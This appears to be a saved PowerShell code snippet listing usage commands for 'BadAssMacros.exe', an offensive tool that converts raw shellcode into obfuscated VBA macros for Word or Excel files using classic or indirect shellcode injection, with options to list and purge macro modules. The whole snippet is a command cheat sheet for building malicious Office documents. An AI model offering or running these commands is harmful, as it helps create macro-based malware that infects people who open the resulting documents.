---
id: d865aabd-1279-4245-9aee-4a32be549452
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:23.622553+00:00'
updated_at: '2023-04-10T20:36:57.674903+00:00'
---

# Code Snippet d865aabd

**Language**: Powershell

```powershell
BadAssMacros.exe -h

# Create VBA for classic shellcode injection from raw shellcode
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt

# Create VBA for indirect shellcode injection from raw shellcode
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>

# List modules inside Doc/Excel file
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l

# Purge Doc/Excel file
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
```


